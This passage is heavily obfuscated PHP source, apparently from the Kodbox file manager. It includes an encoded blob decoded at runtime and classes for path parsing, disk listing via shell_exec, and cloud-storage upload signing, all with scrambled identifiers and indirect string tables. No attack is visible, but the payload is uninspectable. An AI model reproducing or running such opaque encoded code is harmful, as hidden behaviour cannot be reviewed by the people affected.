R8Ã"Ç`')."\10\230\207\366\114\74\355\110\237\374\362\360\347\275\74\324\225\236\7\36\365\362\210\173\147\237\367\136\212\170\176\325\371\146\53\156\63\267\317\53\143\351\335\334\74\37\52".strrev('\\_†0©™ä¯D8k™_Ì=\\NCÎfKRÃ¬¦éN"‹ŠqyJ9œO¹Fà{˜W').strrev('aÿ8Ì@j²y¦¬Ãtù•]ì±ØêıÄÔÒ]`wMÊÔì˜šuIÚK"$Ó5').base64_decode('vr/pD/AAYsYV6auYTjJvkvK6JYlOC9ry1/dcFPh/h/mC96ZZJXvW8jdKy0aAIKE=').base64_decode('ZOkhbUiuo3wDn7BbYvnQLUi8uef8Ft2UK/RDfFZaCfQRNCOHJdQ81rLapuoUxyo=')."\111\35\144\44\230\210\243\223\7\204\65\167\333\311\300\200\56\102\44\113\142\211\134\243\155\270\25\51\270\70\336\227\210\36\57\132\310\301\266\211\357\323\212\65\45\221\224".base64_decode('/8UEMsmDCinCkKNCz/2LGd2o8MiddBr+Oe2mPBOXsryq7ZUQUlK+aXaUTDCNSkI=')."\237\263\257\256\352\121\61\121\307\52\217\62\131\246\162\306\111\172\13\117\170\122\222\130\46\134\232\135\334\233\104\146\146\304\111\176\345\317\316\12\241\200\256\120\307\152\225"."\x7c\xb4\xca\x37\x99\x48\x45\xf2\x32\x28\xaf\x5a\x7a\x6c\x4d\xa8\x51\x88\xde\x5\x3a\x1\x6b\x98\x38\x88\x24\x37\xd8\x2\x9d\xfc\x56\x9b\x2a\x19\xdf\xe0\xf1\x94\xde\xb9\x34\xe4\xb0\xf3\xca".strrev('-_Ù*X‡2¿rÁVSø	éºMtâÈPl¨û÷!Ğ•'."\n".'zîŞ(iHsßDÅy”x')."\x8a\x72\xb4\x87\xd\x14\x8\x20\xb1\x71\xa6\x5f\x93\xf6\x47\xd6\xa8\x41\x29\x34\xd9\xcb\xe5\xce\x67\xcd\x1d\xb7\x48\xb1\xf\x20\xd7\x5a\x67\x77\x53\x2d\xd7\xdb\x8f\xd4\xe7\x28\xd\x33\xf6"."\372\377\367\263\152\377\267\136\123\153\342\16\332\35\57\251\166\2\223\13\255\305\247\117\134\224\247\212\122\127\77\234\333\344\41\200\105\374\355\140\51\316\15\71\231\37\50".base64_decode('5h5KZYcrai7nPmksEwvKHp1EyDfEX0qsFHH6Hk7KLwWXCthKBH2W+WAsl1QZ9yk=')."\x3d\x44\xac\xa7\x86\x2a\x1c\x14\xe2\xc9\x8\x3b\x1d\xf9\x4a\x3c\x43\x59\x36\x41\xbe\x10\x6b\xc1\xfc\x65\xf9\x59\x28\x85\xa5\x28\xcc\x58\x32\xaa\x29\x5f\x83\x8c\x16\x99\xbc\x55\xb\x84\x7a"."\325\142\106\135\310\305\152\40\62\62\141\161\200\312\310\121\302\61\304\16\240\74\172\342\41\165\376\214\263\243\104\267\353\125\76\232\211\271\3\54\177\146\273\374\334\270\274"."\64\137\326\162\21\154\16\353\124\355\360\147\222\353\335\357\46\317\364\226\177\214\132\243\143\355\102\14\313\363\114\103\103\216\64\310\221\143\205\62\24\15\343\42\317\44\13"."\241\362\162\344\257\41\12\165\25\16\311\375\145\313\272\307\64\10\177\346\204\162\35\207\144\175\50\275\331\133\366\46\247\353\150\0\11\113\342\254\114\67\210\27\157\350\166"."\xbc\xb7\xbb\x86\x5c\xa8\x0\x4c\x45\xbc\x7e\x87\x21\xde\x4e\xcf\x17\xa9\xd2\x6c\x9d\xb4\xc5\xb2\x9b\x4c\x92\x21\x30\x80\x1c\xaa\x2d\x4b\x7e\x16\xc1\x59\x12\x9b\x76\x3b\x57\xca\xc2\x4a\xd9".base64_decode('UoZpSdk4vFJe/Oyp7RhN4Vrd7VKdCMZU1nWIvHAwKYOkczvE/aadbzSQRAJmjhg=').base64_decode('oQbp5Ml58MddTpcRspIelpJJKebfC/3iG10h4TqAJFOdemBEtdnxmbuU80Vk6Zg=').base64_decode('MEVwJ1h+EiQOqCQ2gBXDoomg0C64tA0IaqeOCK5FMMfpNH9925E1zcQDDkUQ8VA=').strrev('—¨€J‘Ê¤¾\\YÆK\'İJ°Äİ+8¼©R%ÅC–2:–/“ê®?uXŞÂ¢K¤zæ7')."\175\156\100\43\11\42\330\206\136\130\326\320\256\160\251\132\174\322\171\45\226\147\343\163\206\362\220\33\13\136\7\324\45\132\141\35\5\333\320\135\111\226\374\260\270\363\364"."\117\26\363\45\24\320\162\141\251\72\371\144\160\322\2\361\312\37\21\130\351\34\142\351\56\261\110\140\233\225\134\213\203\330\361\216\101\316\230\234\350\150\216\173\152\211\124".strrev('·SnëÛ•CáPl³på‰å*‰+*vêa-îà.^µs_š$ÎÓI¯Dó—Ğ ')._kodDe('Khv0HR6DX1JYJISIHiGVTJ4agIbVj3aIaFiRZPyOTb94GYq2p7KGHjefW18Z4oaJ').base64_decode('Dx4oAdIVOuwSlWnWycazYubyzwHGuXMTrUHlVghh33XMW6kVFTNP2gqR27ULVKI=').base64_decode('tSylAnUV5/3ldFykVbA+oHXiPVr2LVQhWTZlqGzsEKu49C2nFYILLg8Ms0hCsps=')."\x78\x24\x5e\xb2\xee\x9d\xe6\x20\xe9\xa5\xc2\x50\xc1\xe0\xdb\x44\x5a\xd8\x8d\x61\x3b\x54\xfe\xac\x3a\xff\x5c\x59\x6d\x4e\xd4\x2c\x94\x24\x27\x9b\x15\x8d\x8d\x3d\x58\xd2\x2e\x97\x69\x73\xec".base64_decode('8TDZSptKLYatpzSnJ0/ZqxBNZx/JSfo5l2pMyP2OA/MKyiMCokGfUEE7LN/p/g8=')."\272\167\172\244\326\206\217\156\371\261\13\161\65\111\367\113\232\34\67\114\333\203\323\22\106\221\374\266\32\266\55\216\230\251\64\115\230\74\274\351\171\44\113\11\24\22\147"."\54\170\24\211\332\237\240\43\41\33\44\10\207\173\130\114\215\153\64\225\20\33\107\4\37\47\360\210\274\247\301\41\137\107\311\165\14\51\0\110\210\34\60\306\230\43\77"."\174\273\126\264\107\274\306\256\272\31\71\301\203\0\276\311\166\37\344\16\263\345\247\51\176\160\6\357\45\165\300\353\116\276\65\305\101\107\161\372\106\16\267\145\374\274\32"."\x40\x75\x29\xaa\xa0\x9e\xa0\x89\x82\x9\xbb\x4b\xa7\x8e\x10\xcb\x92\x7a\x2\xf1\xf8\xf2\x68\xac\x9d\x3a\x8e\x2e\x4b\x26\xa5\x24\x3b\x9a\xb2\xa4\x9e\xae\x68\x64\xb2\xb4\x60\x77\x20\x14\x2e".strrev('ÓÆ_)”=•q\'fè¦'."\r".'f/¡S“–ˆ–Ú„V²|º8p•¤=B“Dôğ¤‘7&ÃK')."\362\302\345\227\50\343\124\21\310\363\152\61\157\170\74\340\174\205\305\145\331\306\20\26\52\302\346\62\21\250\73\126\4\50\166\244\315\27\67\147\226\305\121\260\317\161\144"."\54\301\311\332\40\24\105\302\71\171\63\45\200\272\212\3\44\153\123\313\265\373\44\125\14\0\156\330\111\6\330\132\255\61\6\44\355\75\25\125\340\102\34\14\251\144\22"."\x45\xc3\x90\xfc\x7f\x0\xa2\x46\xfc\xdd\xdf\xa6\x0\x0"."", 10, -8))); goto b²†í“‚¤‰; Bºõ¾ùíÏˆ: class KodIO { const KOD_SOURCE = "\173\163\x6f\165\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\x72\122\x65\x63\x79\x63\x6c\x65\175"; const KOD_USER_FAV = "\173\165\x73\x65\x72\106\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\162\106\x69\154\x65\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\x65\162\106\x69\x6c\145\124\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\x75\160\x52\157\157\164\123\145\154\146\x7d"; const KOD_USER_SHARE = "\x7b\165\163\145\162\x53\x68\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\x72\x53\x68\x61\162\x65\114\x69\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\162\145\124\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\x72\x65\x49\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\163\x68\141\x72\145\x49\x74\x65\x6d\114\151\x6e\153\x7d"; const KOD_SEARCH = "\173\x73\x65\141\x72\143\150\175"; const KOD_BLOCK = "\x7b\142\154\x6f\x63\153\175"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\x65\162\x52\x65\x6e\143\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\144\x72\x69\166\145\x72\x7d"; public static function typeList() { $ ˆ˜ò©È =& $_SERVER[¥Ÿ©ÒèÌ]; return array($ ˆ˜ò©È[1228] => self::KOD_SOURCE, $ ˆ˜ò©È[1229] => self::KOD_USER_RECYCLE, $ ˆ˜ò©È[1230] => self::KOD_USER_FAV, $ ˆ˜ò©È[1231] => self::KOD_USER_FILE_TAG, $ ˆ˜ò©È[1232] => self::KOD_USER_FILE_TYPE, $ ˆ˜ò©È[1233] => self::KOD_GROUP_ROOT_SELF, $ ˆ˜ò©È[1234] => self::KOD_USER_SHARE, $ ˆ˜ò©È[1235] => self::KOD_USER_SHARE_LINK, $ ˆ˜ò©È[1236] => self::KOD_USER_SHARE_TO_ME, $ ˆ˜ò©È[1237] => self::KOD_SHARE_ITEM, $ ˆ˜ò©È[1238] => self::KOD_SHARE_LINK, $ ˆ˜ò©È[1239] => self::KOD_SEARCH, $ ˆ˜ò©È[1240] => self::KOD_BLOCK, $ ˆ˜ò©È[1241] => self::KOD_IO, $ ˆ˜ò©È[1242] => self::KOD_USER_RECENT, $ ˆ˜ò©È[1243] => self::KOD_USER_DRIVER); } public static function parse($Ğ²ÁéË) { $‘Ô‘­ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ğ²ÁéË = self::clear($Ğ²ÁéË); $êÒõÜ±ì = array_values(self::typeList()); preg_match($‘Ô‘­[1244], $Ğ²ÁéË, $ÎĞ™…Ÿ¢); $µ˜„´ØË = array($‘Ô‘­[423] => !1, $‘Ô‘­[1245] => !1, $‘Ô‘­[420] => !1, $‘Ô‘­[78] => $Ğ²ÁéË, $‘Ô‘­[1154] => !1, $‘Ô‘­[1153] => $‘Ô‘­[12]); if (is_array($ÎĞ™…Ÿ¢) && count($ÎĞ™…Ÿ¢) == 5) { $›øúğ÷¥ = $‘Ô‘­[1246] . $ÎĞ™…Ÿ¢[2] . $‘Ô‘­[331]; if (in_array($›øúğ÷¥, $êÒõÜ±ì)) { $µ˜„´ØË[$‘Ô‘­[1154]] = $ÎĞ™…Ÿ¢[1]; $µ˜„´ØË[$‘Ô‘­[33]] = $›øúğ÷¥; $µ˜„´ØË[$‘Ô‘­[1247]] = substr($›øúğ÷¥, 1, -1); $µ˜„´ØË[$‘Ô‘­[401]] = $ÎĞ™…Ÿ¢[3]; } $µ˜„´ØË[$‘Ô‘­[1153]] = $ÎĞ™…Ÿ¢[4]; } $êóŞ™Ô‹ = array($‘Ô‘­[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $µ˜„´ØË[$‘Ô‘­[1209]] = in_array($µ˜„´ØË[$‘Ô‘­[33]], $êóŞ™Ô‹); return $µ˜„´ØË; } public static function isTruePath($öõƒ•æ”) { $»´ê®ûÌ =& $_SERVER[¥Ÿ©ÒèÌ]; if (substr($öõƒ•æ”, 0, 1) != $»´ê®ûÌ[1246]) { return !0; } if (strpos($öõƒ•æ”, $»´ê®ûÌ[409]) === 0) { return !0; } if (strpos($öõƒ•æ”, $»´ê®ûÌ[1213]) === 0) { return !0; } if (strpos($öõƒ•æ”, $»´ê®ûÌ[1248]) === 0) { return !0; } if (strpos($öõƒ•æ”, $»´ê®ûÌ[1249]) === 0) { return !0; } if (strpos($öõƒ•æ”, $»´ê®ûÌ[1250]) === 0) { return !0; } return !1; } public static function clear($ë…ËàÄ¢) { $ñåÊñÉ¤ =& $_SERVER[¥Ÿ©ÒèÌ]; $ë…ËàÄ¢ = str_replace(array($ñåÊñÉ¤[1064], $ñåÊñÉ¤[226]), $ñåÊñÉ¤[53], $ë…ËàÄ¢); $ë…ËàÄ¢ = str_replace($ñåÊñÉ¤[98], $ñåÊñÉ¤[8], $ë…ËàÄ¢); $—Ê¡¾Ø¹ = $ñåÊñÉ¤[1251]; if (substr($ë…ËàÄ¢, 0, 3) == $ñåÊñÉ¤[1252]) { $ë…ËàÄ¢ = substr($ë…ËàÄ¢, 3); } while (strstr($ë…ËàÄ¢, $—Ê¡¾Ø¹)) { $ë…ËàÄ¢ = str_replace($—Ê¡¾Ø¹, $ñåÊñÉ¤[8], $ë…ËàÄ¢); } $ë…ËàÄ¢ = preg_replace($ñåÊñÉ¤[1253], $ñåÊñÉ¤[8], $ë…ËàÄ¢); if ($ë…ËàÄ¢ == $ñåÊñÉ¤[8]) { return $ñåÊñÉ¤[8]; } $ë…ËàÄ¢ = rtrim($ë…ËàÄ¢, $ñåÊñÉ¤[8]); return $ë…ËàÄ¢; } public static function sourceID($À—½µ…‹) { $Úı¤©‡ƒ =& $_SERVER[¥Ÿ©ÒèÌ]; $•©Í½Ïá = self::parse($À—½µ…‹); if ($•©Í½Ïá[$Úı¤©‡ƒ[33]] !== self::KOD_SOURCE) { show_json(LNG($Úı¤©‡ƒ[1254]), !1); } return $•©Í½Ïá[$Úı¤©‡ƒ[401]]; } public static function make($¨ş½ÕÙ) { if (!$¨ş½ÕÙ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¨ş½ÕÙ)); } public static function makeShare($¶—ı®·¾, $¹›ò™‡ã) { return self::makePath(self::KOD_SHARE_ITEM, $¶—ı®·¾, $¹›ò™‡ã); } public static function makeFileTypePath($Üâ¡›­) { return self::makePath(self::KOD_USER_FILE_TYPE, $Üâ¡›­); } public static function makeFileTagPath($èàü•Åí) { return self::makePath(self::KOD_USER_FILE_TAG, $èàü•Åí); } public static function makePath($íæúğÕò, $”Ø˜³½ë = '', $§úÙí²¦ = '') { $Ü“Òø¦Â =& $_SERVER[¥Ÿ©ÒèÌ]; $¼Úñß¾ë = substr($íæúğÕò, 1, -1); $Å§œÒ±ş = $Ü“Òø¦Â[1255] . $¼Úñß¾ë . $Ü“Òø¦Â[1256] . $”Ø˜³½ë . $Ü“Òø¦Â[1257]; $Å§œÒ±ş = $§úÙí²¦ ? $Å§œÒ±ş . $§úÙí²¦ . $Ü“Òø¦Â[8] : $Å§œÒ±ş; return $Å§œÒ±ş; } public static function hashPath($§ƒè —›, $´˜×ú©ƒ = true) { $°«É½Ï– =& $_SERVER[¥Ÿ©ÒèÌ]; $…¿ÂÈ ¶ = is_array($§ƒè —›) ? $§ƒè —› : IO::info($§ƒè —›); $íÏê‡á† = _get($…¿ÂÈ ¶, $°«É½Ï–[1258], $°«É½Ï–[12]); if (!$íÏê‡á† && isset($…¿ÂÈ ¶[$°«É½Ï–[403]])) { $…¿ÂÈ ¶ = IO::info(KodIO::make($…¿ÂÈ ¶[$°«É½Ï–[403]])); $íÏê‡á† = _get($…¿ÂÈ ¶, $°«É½Ï–[1258], $°«É½Ï–[12]); } if (!$íÏê‡á† && $´˜×ú©ƒ) { $‡êÏ§Ô = KodIO::parse($…¿ÂÈ ¶[$°«É½Ï–[78]]); if (!$‡êÏ§Ô[$°«É½Ï–[33]]) { $íÏê‡á† = IO::hashSimple($…¿ÂÈ ¶[$°«É½Ï–[78]]); } } if (!$íÏê‡á†) { $íÏê‡á† = md5($…¿ÂÈ ¶[$°«É½Ï–[78]] . $…¿ÂÈ ¶[$°«É½Ï–[80]] . $…¿ÂÈ ¶[$°«É½Ï–[86]]); } return $íÏê‡á†; } public static function initSystemPath() { $œàÓ˜Ş =& $_SERVER[¥Ÿ©ÒèÌ]; if (defined($œàÓ˜Ş[1259])) { return; } define($œàÓ˜Ş[1259], self::systemPath($œàÓ˜Ş[1260])); define($œàÓ˜Ş[1261], self::systemPath($œàÓ˜Ş[1262])); define($œàÓ˜Ş[1263], self::systemPath($œàÓ˜Ş[1264])); define($œàÓ˜Ş[1265], self::systemPath($œàÓ˜Ş[1266])); IOHistory::bindEvent(); } public static function systemPath($ş÷ìÑûù) { $Ôü÷¸Ù =& $_SERVER[¥Ÿ©ÒèÌ]; $Ç·ÇÁé¨ = $Ôü÷¸Ù[1267] . ucfirst($ş÷ìÑûù); $©•…Ãå¿ = Model($Ôü÷¸Ù[760])->get($Ç·ÇÁé¨); if ($©•…Ãå¿) { return $©•…Ãå¿; } if ($ş÷ìÑûù == $Ôü÷¸Ù[1260]) { $©•…Ãå¿ = self::make(Model($Ôü÷¸Ù[815])->systemRootPathAdd($Ôü÷¸Ù[537])); } else { $©•…Ãå¿ = self::systemPath($Ôü÷¸Ù[1260]); $ËâƒÍ™é = self::sourceID($©•…Ãå¿); $©•…Ãå¿ = self::make(Model($Ôü÷¸Ù[815])->mkdir($ËâƒÍ™é, $ş÷ìÑûù)); } Model($Ôü÷¸Ù[760])->set($Ç·ÇÁé¨, $©•…Ãå¿); return $©•…Ãå¿; } public static function systemFolder($Ì¥Ïş™Ò) { $ï“á¬—Å = IO_PATH_SYSTEM_SOURCE . $Ì¥Ïş™Ò; $µÃŠŸÁ‹ = Cache::get($ï“á¬—Å); if (!$µÃŠŸÁ‹) { $Ÿô¸¥à¸ = IO::infoFull($ï“á¬—Å); if (!$Ÿô¸¥à¸) { $µÃŠŸÁ‹ = IO::mkdir($ï“á¬—Å, REPEAT_SKIP); } else { $µÃŠŸÁ‹ = $Ÿô¸¥à¸[$_SERVER[¥Ÿ©ÒèÌ][78]]; } Cache::set($ï“á¬—Å, $µÃŠŸÁ‹, 3600 * 10); } return $µÃŠŸÁ‹; } public static function defaultDriver() { return Model($_SERVER[¥Ÿ©ÒèÌ][757])->defaultDriver(); } public static function defaultIO() { $ÍôÁü… =& $_SERVER[¥Ÿ©ÒèÌ]; $ŠµÍ Å = self::defaultDriver(); return $ÍôÁü…[1268] . $ŠµÍ Å[$ÍôÁü…[401]] . $ÍôÁü…[1257]; } public static function defaultDriverInit() { static $Œ©©ƒÇä = false; if ($Œ©©ƒÇä) { return $Œ©©ƒÇä; } $Œ©©ƒÇä = IO::init(self::defaultIO()); return $Œ©©ƒÇä; } public static function fileTypeList() { $ëíÆò³£ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÆÚƒà™ = $GLOBALS[$ëíÆò³£[6]][$ëíÆò³£[1269]]; foreach ($ÆÚƒà™ as $¥‚üèğ => $Ù”îÑ) { $®ıš„Æ = $ëíÆò³£[1270] . $¥‚üèğ; $Ï†¤ôï = LNG($®ıš„Æ); if ($®ıš„Æ != $Ï†¤ôï) { $ÆÚƒà™[$¥‚üèğ][$ëíÆò³£[32]] = $Ï†¤ôï; } } return $ÆÚƒà™; } public static function diskList($ÔàÃÒô = true) { $“ÃĞ¸Çª = $_SERVER[¥Ÿ©ÒèÌ][1271]; if ($ÔàÃÒô) { $ËäÚ¦ = Cache::get($“ÃĞ¸Çª); if (is_array($ËäÚ¦)) { return $ËäÚ¦; } } $ËäÚ¦ = self::diskListGet(); Cache::set($“ÃĞ¸Çª, $ËäÚ¦, 60); return $ËäÚ¦; } public static function diskListGet() { $‰«ÕÅÔ‡ =& $_SERVER[¥Ÿ©ÒèÌ]; $ù©Æ– = array(); if ($GLOBALS[$‰«ÕÅÔ‡[6]][$‰«ÕÅÔ‡[1272]] == $‰«ÕÅÔ‡[1273]) { $Òôó›¾Ô = $‰«ÕÅÔ‡[1274]; for ($¿áü–– = 0; $¿áü–– < strlen($Òôó›¾Ô); $¿áü––++) { $óáŸíìš = $Òôó›¾Ô[$¿áü––] . $‰«ÕÅÔ‡[1275]; if (file_exists($óáŸíìš)) { $ù©Æ–[] = $óáŸíìš; } } return $ù©Æ–; } if (!function_exists($‰«ÕÅÔ‡[99])) { $ù©Æ–[] = $‰«ÕÅÔ‡[825]; return $ù©Æ–; } $ıöÇ´¸é = explode($‰«ÕÅÔ‡[226], shell_exec($‰«ÕÅÔ‡[1276])); array_shift($ıöÇ´¸é); array_pop($ıöÇ´¸é); $¨ÒÄšÕ‡ = array($‰«ÕÅÔ‡[1277], $‰«ÕÅÔ‡[1278], $‰«ÕÅÔ‡[1279], $‰«ÕÅÔ‡[1280], $‰«ÕÅÔ‡[1281], $‰«ÕÅÔ‡[1282], $‰«ÕÅÔ‡[1283], $‰«ÕÅÔ‡[1284]); foreach ($ıöÇ´¸é as $É‰Æ•ç) { $ŠĞ§Ÿå± = preg_split($‰«ÕÅÔ‡[1285], $É‰Æ•ç); $óáŸíìš = $ŠĞ§Ÿå±[count($ŠĞ§Ÿå±) - 1]; if (!strstr($ŠĞ§Ÿå±[0], $‰«ÕÅÔ‡[1286]) || !$óáŸíìš) { continue; } $Èì€Â ì = rtrim($óáŸíìš, $‰«ÕÅÔ‡[8]) . $‰«ÕÅÔ‡[8]; if (in_array($Èì€Â ì, $¨ÒÄšÕ‡)) { continue; } $ù©Æ–[] = $Èì€Â ì; } return $ù©Æ–; } public static function isSameDisk($øµØæ¹û, $¾Ÿ‰–) { $ç­Œ¼‘ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($GLOBALS[$ç­Œ¼‘[6]][$ç­Œ¼‘[1272]] == $ç­Œ¼‘[1273]) { return strtolower(substr($øµØæ¹û, 0, 1)) == strtolower(substr($¾Ÿ‰–, 0, 1)); } $åó”„î = self::diskList(); $ÜüëÁğ = !1; $øâ¡ä½­ = !1; sort($åó”„î); $åó”„î = array_reverse($åó”„î); $øµØæ¹û = rtrim($øµØæ¹û, $ç­Œ¼‘[8]) . $ç­Œ¼‘[8]; $¾Ÿ‰– = rtrim($¾Ÿ‰–, $ç­Œ¼‘[8]) . $ç­Œ¼‘[8]; foreach ($åó”„î as $ûÍÊıŠ€) { $äœğèÄµ = strlen($ûÍÊıŠ€); if (!$ÜüëÁğ && substr($øµØæ¹û, 0, $äœğèÄµ) == $ûÍÊıŠ€) { $ÜüëÁğ = $ûÍÊıŠ€; } if (!$øâ¡ä½­ && substr($¾Ÿ‰–, 0, $äœğèÄµ) == $ûÍÊıŠ€) { $øâ¡ä½­ = $ûÍÊıŠ€; } if ($ÜüëÁğ && $øâ¡ä½­) { break; } } return $ÜüëÁğ === $øâ¡ä½­; } public static function transferType($¾ÓıÈ…ª, $ÕêÏ¸Œ) { $É£¾÷Ş =& $_SERVER[¥Ÿ©ÒèÌ]; $Ñ§ÓÈõİ = self::driverType($¾ÓıÈ…ª); $•„ÛÖë = self::driverType($ÕêÏ¸Œ); if ($Ñ§ÓÈõİ[$É£¾÷Ş[33]] == $•„ÛÖë[$É£¾÷Ş[33]] && $Ñ§ÓÈõİ[$É£¾÷Ş[1287]] == $•„ÛÖë[$É£¾÷Ş[1287]]) { return $É£¾÷Ş[1288]; } if ($Ñ§ÓÈõİ[$É£¾÷Ş[33]] == $É£¾÷Ş[854] && $•„ÛÖë[$É£¾÷Ş[33]] == $É£¾÷Ş[107]) { return $É£¾÷Ş[1183]; } if ($Ñ§ÓÈõİ[$É£¾÷Ş[33]] == $É£¾÷Ş[107] && $•„ÛÖë[$É£¾÷Ş[33]] == $É£¾÷Ş[854]) { return $É£¾÷Ş[108]; } return $É£¾÷Ş[1289]; } public static function driverType($±–“ÄÅ³) { $Å–Ñİ•€ =& $_SERVER[¥Ÿ©ÒèÌ]; $ô«Í±Ú² = str_replace($Å–Ñİ•€[1290], $Å–Ñİ•€[12], strtolower($±–“ÄÅ³->getType())); if ($ô«Í±Ú² == $Å–Ñİ•€[748] || $ô«Í±Ú² == $Å–Ñİ•€[1291] || $ô«Í±Ú² == $Å–Ñİ•€[1292]) { $±–“ÄÅ³ = self::defaultDriverInit(); } else { if ($ô«Í±Ú² == $Å–Ñİ•€[1190] || $ô«Í±Ú² == $Å–Ñİ•€[1293]) { $±–“ÄÅ³ = IO::init($±–“ÄÅ³->pathParse[$Å–Ñİ•€[1137]]); } } $ğİÏç¬Ñ = $±–“ÄÅ³->path; $ô«Í±Ú² = str_replace($Å–Ñİ•€[1290], $Å–Ñİ•€[12], strtolower($±–“ÄÅ³->getType())); if ($ô«Í±Ú² == $Å–Ñİ•€[107]) { return array($Å–Ñİ•€[33] => $Å–Ñİ•€[107], $Å–Ñİ•€[1287] => $Å–Ñİ•€[12], $Å–Ñİ•€[78] => $ğİÏç¬Ñ); } return array($Å–Ñİ•€[33] => $Å–Ñİ•€[854], $Å–Ñİ•€[1287] => $±–“ÄÅ³->pathDriver, $Å–Ñİ•€[78] => $ğİÏç¬Ñ); } public static function pathDriverType($ü’¨›ˆ) { return $ü’¨›ˆ ? self::driverType(IO::init($ü’¨›ˆ)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ç±Ö¡ƒ¡) { parent::__construct($ç±Ö¡ƒ¡); $this->signatureVersion($_SERVER[¥Ÿ©ÒèÌ][211]); } public function uploadFormData($ªç²Ğ—Œ, $åªÖÍ = 3600) { $•äışÉ¢ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ôè¦…ğ = $•äışÉ¢[191]; $Ç¡çÂ›« = $•äışÉ¢[227]; $µõé„„Ç = $•äışÉ¢[1294]; $Ş˜²à›Ÿ = gmdate($•äışÉ¢[1295], time() + $åªÖÍ); $Õ±¥¯Û€ = (string) time() . $•äışÉ¢[71] . (string) (time() + $åªÖÍ); $ÛüùêÁ¼ = array($•äışÉ¢[1296] => $Ş˜²à›Ÿ, $•äışÉ¢[1297] => array(array($•äışÉ¢[1298] => $Ôè¦…ğ), array($•äışÉ¢[1299] => $this->bucket), array($•äışÉ¢[1300], $•äışÉ¢[1301], $•äışÉ¢[12]), array($•äışÉ¢[1302] => $µõé„„Ç), array($•äışÉ¢[1303] => $Ç¡çÂ›«), array($•äışÉ¢[1304] => $this->accessKey), array($•äışÉ¢[1305] => $Õ±¥¯Û€))); $ÛüùêÁ¼ = json_encode($ÛüùêÁ¼); $üñ÷†É = hash_hmac($•äışÉ¢[227], $Õ±¥¯Û€, $this->secret); $¥Á‡º¦Á = sha1($ÛüùêÁ¼); $âŠÉğô = hash_hmac($•äışÉ¢[227], $¥Á‡º¦Á, $üñ÷†É); $„ó¿ò»… = array($•äışÉ¢[1298] => $Ôè¦…ğ, $•äışÉ¢[1302] => $µõé„„Ç, $•äışÉ¢[1306] => base64_encode($ÛüùêÁ¼), $•äışÉ¢[1303] => $Ç¡çÂ›«, $•äışÉ¢[1304] => $this->accessKey, $•äışÉ¢[1307] => $Õ±¥¯Û€, $•äışÉ¢[1308] => $âŠÉğô, $•äışÉ¢[174] => $this->getHost()); return $„ó¿ò»…; } public function fileOutLink($¾ùí©Àò) { $Å¦¤Ö£ =& $_SERVER[¥Ÿ©ÒèÌ]; if (substr($¾ùí©Àò, 0, 7) == $Å¦¤Ö£[1309]) { $¾ùí©Àò = $Å¦¤Ö£[1310] . substr($¾ùí©Àò, 7); } header($Å¦¤Ö£[158] . $¾ùí©Àò); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Í¾Ìõ) { $this->pathParse = $Í¾Ìõ; $this->model = Model($_SERVER[¥Ÿ©ÒèÌ][1311]); } public function getPath($–°¸Á´Ö) { return trim($–°¸Á´Ö, $_SERVER[¥Ÿ©ÒèÌ][8]); } public function pathFather($ç£ªøïæ) { $ŞÚÃäúû = $this->parse($ç£ªøïæ); $ŞÚÃäúû = $this->infoSimple($ç£ªøïæ); return $ŞÚÃäúû ? $ŞÚÃäúû[$_SERVER[¥Ÿ©ÒèÌ][498]] : !1; } public function pathThis($­Û§ÎøÈ) { $¾‚Áññù = $this->infoSimple($­Û§ÎøÈ); return $¾‚Áññù ? $¾‚Áññù[$_SERVER[¥Ÿ©ÒèÌ][32]] : !1; } public function getPathOuter($è¥Óš‹–) { if (!$è¥Óš‹–) { return $è¥Óš‹–; } $àùÙ§‰É = $this->parse($è¥Óš‹–); return KodIO::make($àùÙ§‰É[$_SERVER[¥Ÿ©ÒèÌ][401]]); } public function copyFolderFromIO($üŒ’Ïõ‘, $Íø¤°ã‹, $ó¡£Ê¨‡, $¹İÁ‚Ğ¿, $´Î©œ¿×) { $ê“ãçÆ° = $this->model->copyFolderFromIO($üŒ’Ïõ‘, $Íø¤°ã‹, $ó¡£Ê¨‡, $¹İÁ‚Ğ¿, $´Î©œ¿×); return KodIO::make($ê“ãçÆ°); } public function isParentOf($çà›Ãü, $¼ÁŸ›™) { return $this->model->isParentOf($çà›Ãü, $¼ÁŸ›™); } public function mkfile($êèŞ–œà, $«Ä©Íø¶ = '', $…ì¡ğŒÓ = REPEAT_RENAME) { $ì¨•ÊşÁ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÌÓö…ÍŒ = $this->parse($êèŞ–œà); $êèŞ–œà = $ÌÓö…ÍŒ[$ì¨•ÊşÁ[401]]; for ($†ùª‹ = 0; $†ùª‹ < count($ÌÓö…ÍŒ[$ì¨•ÊşÁ[1312]]); $†ùª‹++) { $Áïò‰…® = $ÌÓö…ÍŒ[$ì¨•ÊşÁ[1312]][$†ùª‹]; if ($†ùª‹ == count($ÌÓö…ÍŒ[$ì¨•ÊşÁ[1312]]) - 1) { $êèŞ–œà = $this->model->mkfile($êèŞ–œà, $Áïò‰…®, $«Ä©Íø¶, $…ì¡ğŒÓ); break; } $êèŞ–œà = $this->model->mkdir($êèŞ–œà, $Áïò‰…®, REPEAT_SKIP); } return $this->getPathOuter($êèŞ–œà); } public function mkdir($ñ’ÚºúØ, $Õëú—ç¢ = REPEAT_SKIP) { $Ô¾À­€ =& 